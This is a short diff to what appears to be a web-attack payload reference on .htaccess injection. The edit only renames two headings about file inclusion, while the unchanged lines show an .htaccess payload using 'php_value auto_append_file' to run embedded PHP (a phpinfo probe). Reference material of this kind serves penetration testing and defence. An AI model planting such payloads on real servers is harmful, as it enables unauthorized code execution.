@@ -1,7 +1,7 @@
 htaccess injection payload
 ================================
 
-file inclusion
+local file inclusion
 --------------------------------
 ::
 
@@ -14,7 +14,7 @@ code execution
     php_value auto_append_file .htaccess
     #<?php phpinfo();
 
-file inclusion
+file inclusion by protocol
 --------------------------------
 ::
 
